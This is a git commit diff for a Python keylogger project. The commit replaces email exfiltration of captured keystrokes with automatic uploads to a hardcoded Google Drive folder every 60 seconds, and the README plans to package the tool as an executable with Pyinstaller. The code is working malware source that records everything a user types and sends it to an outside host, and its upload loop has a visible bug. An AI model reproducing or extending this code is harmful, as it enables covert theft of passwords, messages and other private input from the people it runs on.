027472ea149b23f13942f2434c8e2b0c6be23412
FrostTechHub <111039542+FrostTechHub@users.noreply.github.com>
2023-02-06 20:59:47 +0800

    1st Commit
    + Updated kylog.py script
    + Updated requirements.txt
    + Added Google.py script to folder
    + Added Sample KeyLog Text File

--- README.md
+++ README.md
@@ -1,10 +1,8 @@
 # Project_Keylogger
- Simple Keylogger program using python language. The aim is to record down every keystroke the user makes on the keyboard. 
+ Simple Keylogger program using python language. This program utilizes Google Drive API to upload the file into the Google Drive Folder.
 
 
 
  Things to do:
- [+]    Create an FTP server on ESXi
- [+]    Point the keylogger to send report to FTP Server
  [+]    Build this code into an executable using Pyinstaller
 
--- kylog.py
+++ kylog.py
@@ -1,19 +1,28 @@
+from __future__ import print_function
 import keyboard #For Logging Keystrokes
-import smtplib #For sending email using SMTP Protocol (Gmail)
-
 from threading import Timer #Ensures is to make a method run after an 'interval' amount of time
-from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
+from datetime import datetime #Mark files with datetime timestamp
+from Google import Create_Service
+from googleapiclient.http import MediaFileUpload
 
+#Google Create_Service Content
+CLIENT_SECRET_FILE = 'client_file_keylogger_frost.json'
+API_SERVICE_NAME = 'drive'
+API_VERSION = 'v3'
+SCOPES = ["https://www.googleapis.com/auth/drive","https://www.googleapis.com/auth/drive.file"]
+
+#Google Drive Folder
+folder_id = "1_sPBAhiEwzh45f2Vrea3NUJ7uGUhsUqm"
+mime_types = ["text/plain"]
+service = Create_Service(CLIENT_SECRET_FILE, API_SERVICE_NAME, API_VERSION, SCOPES)
+
+#Duration To Send Report
 SEND_REPORT_EVERY = 60
-EMAIL_ADDRESS = "<insert email address>"
-EMAIL_PASSWORD = "<insert password>"
 
 class keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="file"):
         self.interval = interval #Pass SEND_REPORT_EVERY to "interval" variable
-        self.report_method = report_method 
+        self.report_method = report_method #Utilizing GoogleDriveApi to upload file
         self.log = "" #Contains the log of all the keystrokes within 'self.interval'
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
@@ -21,7 +30,6 @@ class keylogger:
     #callback func invoked whenever a keyboard event occurs
     def callback(self, event):
         name = event.name
-
 
         if len(name) > 1:
             #Not a character, special key (E.g. Ctrl, Alt, Etc)
@@ -37,53 +45,39 @@ class keylogger:
 
         self.log += name #Add key name to global 'self.log' variable
     
-    #update_filename func used to rename filenames to be identified by start & end datestimes
+    #used to rename filenames to be identified by start & end datestimes
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-    #report_to_file func creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
-    def report_to_file(self):
-        with open(f"{self.filename}.txt", "w") as f: #opens the file in write mode
-            print(self.log, file=f) #writes the keylogs to file
+    #creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
+    def report_to_file(self, mime_types, folder_id):
+        
+        with open(f'{self.filename}.txt', 'w') as f: #opens the file in write mode
+                print(self.log, file=f) #writes the keylogs to file
         print(f"[+] Saved {self.filename}.txt")
+        
+        for file_name, mime_types in zip(f'{self.filename}.txt', mime_types):
+            file_metadata = {
+                'name' : f'{self.filename}.txt',
+            'parents' : [folder_id]
+            }
 
-    #Func to construct a MIMEMultipart from a text. Creates a HTML version as well as test version to be sent as an email.
-    def prepare_mail(self, message):
-        msg = MIMEMultipart("alternative")
-        msg["From"] = EMAIL_ADDRESS
-        msg["To"] = EMAIL_ADDRESS
-        msg["Subject"] = "Keylogger Logs"
-        html = f"<p>{message}</p>"
-        text_part = MIMEText(message, "plain")
-        html_part = MIMEText(html, "html")
-        msg.attach(text_part)
-        msg.attach(html_part)
+            media = MediaFileUpload(f'{self.filename}.txt', resumable=True)
 
-        return msg.as_string() #convert back as string message
+            service.files().create(body=file_metadata, media_body=media, fields="id").execute()
+            print(f"[+] Successfully Uploaded: {self.filename},txt")
 
-    def sendmail(self, email, password, message, verbose=1):
-        server = smtplib.SMTP(host="", port=587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, self.prepare_mail(message))
-        server.quit()
-        if verbose:
-            print(f"{datetime.now()} - Send an email to {email} containing: {message}")
-
-    #Func invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
+    #invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
     def report(self):
 
         #If there is something in log, report it
         if self.log:
             self.end_dt = datetime.now()
             self.update_filename() #Update filename
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
-            print(f"[{self.filename}] - {self.log}") #If you don't want to print in the console, comment below line
+            self.report_to_file(mime_types, folder_id)
+            #print(f"[{self.filename}] - {self.log}") #If you don't want to print in the console, comment this line
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
